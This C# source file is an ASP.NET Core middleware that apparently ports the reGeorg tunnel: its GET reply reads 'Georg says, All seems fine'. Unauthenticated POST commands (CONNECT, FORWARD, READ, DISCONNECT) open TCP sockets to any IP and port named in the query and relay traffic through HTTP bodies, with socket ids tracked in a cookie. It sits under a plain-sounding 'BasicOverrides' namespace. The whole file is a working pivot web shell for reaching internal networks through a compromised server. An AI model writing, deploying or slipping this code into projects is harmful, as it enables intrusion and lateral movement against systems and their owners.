using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Http.Features;
using Microsoft.Extensions.Logging;

namespace Ataoge.AspNetCore.BasicOverrides
{
    internal class GernicSockerMiddleware
    {
        private readonly RequestDelegate _next;
        private readonly ILogger _logger;

        private ConcurrentDictionary<string, Socket> sockets = new ConcurrentDictionary<string, Socket>();
        private const string key = ".ATAOGE.ASPNETCORE.SOCKET";

        public GernicSockerMiddleware(RequestDelegate next, ILoggerFactory loggerFactory)
        {
            if (next == null)
            {
                throw new ArgumentNullException(nameof(next));
            }
            _next = next;
            _logger = loggerFactory.CreateLogger<GernicSockerMiddleware>();
        }

        public async Task Invoke(HttpContext context)
        {
            //_logger.LogInformation("{0}{1}", context.Request.Path,context.Request.QueryString.ToString());
            try
            {
                if (context.Request.Method == "POST")
                {
                    string cmd = context.Request.Query["cmd"].FirstOrDefault()?.ToUpper();
                    if (cmd == "CONNECT")
                    {
                        try
                        {
                            string target = context.Request.Query["target"].FirstOrDefault()?.ToUpper();
                            int port = int.Parse(context.Request.Query["port"].FirstOrDefault());
                            IPAddress ip = IPAddress.Parse(target);
                            IPEndPoint remoteEP = new IPEndPoint(ip, port);
                            Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                            
                            sender.Connect(remoteEP);
                            sender.Blocking = false;
                            string sid = Guid.NewGuid().ToString();
                            _logger.LogInformation("CONNECT: {0}, {1}", sid, sockets.Count);
                            if (sockets.Count > 5)
                            {
                                sockets.Clear();
                            }
                            sockets.TryAdd(sid, sender);
                            //context.Session.Set("socket", sender);
                            context.Response.Cookies.Append(key, sid, new CookieOptions() { HttpOnly = true });
                            
                            context.Response.Headers.Add("X-STATUS", "OK");
                        }
                        catch (Exception ex)
                        {
                            _logger.LogInformation("CONNECT: {0}", ex.Message);
                            context.Response.Headers.Add("X-ERROR", ex.Message);
                            context.Response.Headers.Add("X-STATUS", "FAIL");
                        }
                    }
                    else if (cmd == "DISCONNECT")
                    {
                        //string value;
                        _logger.LogInformation("DISCONNECT: {0}", "enter");
                        context.Request.Cookies.TryGetValue(key, out string value);
                        _logger.LogInformation("DISCONNECT: GetCookie {0}", value);
                        if (!string.IsNullOrEmpty(value))
                        {
                            Socket socket;
                            if (sockets.TryRemove(value, out socket))
                            {
                                if (socket != null)
                                {
                                    try
                                    {
                                        socket.Close();
                  
                                    }
                                    catch (Exception)
                                    {

                                    }
                                }
                            }
                        }
                        context.Response.Headers.Add("X-STATUS", "OK");
                    }
                    else if (cmd == "FORWARD")
                    {
                        _logger.LogInformation("FORWARD: {0}", "enter");
                        context.Request.Cookies.TryGetValue(key, out string value);
                        _logger.LogInformation("FORWARD: GetCookie {0}", value);
                        if (!string.IsNullOrEmpty(value))
                        {
                            Socket socket;
                            if (sockets.TryGetValue(value, out socket))
                            {
                                if (socket != null)
                                {
                                    try
                                    {
                                        long buffLen = context.Request.ContentLength.Value;
                                        byte[] buff = new byte[buffLen];
                                        int c = 0;
                                        while ((c = await context.Request.Body.ReadAsync(buff, 0, buff.Length)) > 0)
                                        {
                                            socket.Send(buff);
                                        }
                                        _logger.LogWarning("FORWARD: send {0}", buff);
                                        context.Response.Headers.Add("X-STATUS", "OK");
                                    }
                                    catch (Exception ex)
                                    {
                                        _logger.LogError("FORWARD: {0}", ex.Message);
                                        context.Response.Headers.Add("X-ERROR", ex.Message);
                                        context.Response.Headers.Add("X-STATUS", "FAIL");
                                    }
                                }
                            }
                        }
                        //context.Response.Headers.Add("X-STATUS", "FAIL");
                    }
                    else if (cmd == "READ")
                    {
                        _logger.LogInformation("READ: {0}", "enter");
                        context.Request.Cookies.TryGetValue(key, out string value);
                        _logger.LogInformation("READ: GetCookie {0}", value);
                        if (!string.IsNullOrEmpty(value))
                        {
                            Socket socket;
                            if (sockets.TryGetValue(value, out socket))
                            {
                                if (socket != null)
                                {
                                    try
                                    {
                                        int c = 0;
                                        byte[] readBuff = new byte[512];
                                        try
                                        {
                                            //先添加Header 避免写过数据无法添加
                                            context.Response.Headers.Add("X-STATUS", "OK");
                                            while ((c = socket.Receive(readBuff)) > 0)
                                            {
                                                byte[] newBuff = new byte[c];
                                                //Array.ConstrainedCopy(readBuff, 0, newBuff, 0, c);
                                                Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                                                await context.Response.Body.WriteAsync(newBuff, 0, newBuff.Length);
                                            }
                                            
                                            // 此处添加会报错，移到前面去添加
                                            //context.Response.Headers.Add("X-STATUS", "OK");
                                        }
                                        catch (SocketException)
                                        {
                                           
                                            //_logger.LogError("{0},{1}", soex.ErrorCode, soex.Message);
                                            // 此处添加会报错，移到前面去添加
                                            //context.Response.Headers.Add("X-STATUS", "OK");
                                            return;
                                        }

                                    }
                                    catch (Exception ex)
                                    {
                                        context.Response.Headers.Add("X-ERROR", ex.Message);
                                        context.Response.Headers.Add("X-STATUS", "FAIL");
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        await _next(context);
                    }

                }
                else
                {
                   
                    var consentFeature = context.Features.Get<ITrackingConsentFeature>();
                    consentFeature.GrantConsent();
                    context.Response.WriteAsync("Georg says, 'All seems fine'").Wait();

                }

            }
            catch (Exception exKak)
            {
                context.Response.Headers.Add("X-ERROR", exKak.Message);
                context.Response.Headers.Add("X-STATUS", "FAIL");
            }
        }
    }
}